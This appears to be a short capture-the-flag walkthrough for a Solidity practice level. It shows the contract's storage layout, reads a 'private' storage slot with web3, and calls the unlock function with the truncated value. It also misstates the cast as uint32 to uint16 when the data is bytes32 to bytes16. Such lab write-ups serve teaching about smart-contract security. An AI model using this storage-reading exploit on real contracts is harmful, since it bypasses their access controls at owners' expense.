## Execute in console

```
  bool public locked = true; // slot 0
  uint256 public ID = block.timestamp; // slot 1
  uint8 private flattening = 10; // slot 2
  uint8 private denomination = 255; // slot 2
  uint16 private awkwardness = uint16(now); // slot 2
  bytes32[3] private data; // slot 3, 4, 5
```

data[2] is slot 5. Hence:

```
await web3.eth.getStorageAt('0x1BB7Acf8E728D706Cc72f18CC816D33E6d8A073a', 5)
> '0x6937de8245732f84b28931bc5bbed14045044fc67a42efb1c249b44c99dee2db'
```

Truncate the string to cast uint32 to uint16:

```
await contract.unlock('0x6937de8245732f84b28931bc5bbed14045044fc67a42efb1c249b44c99dee2db'.slice(0, 34))
```
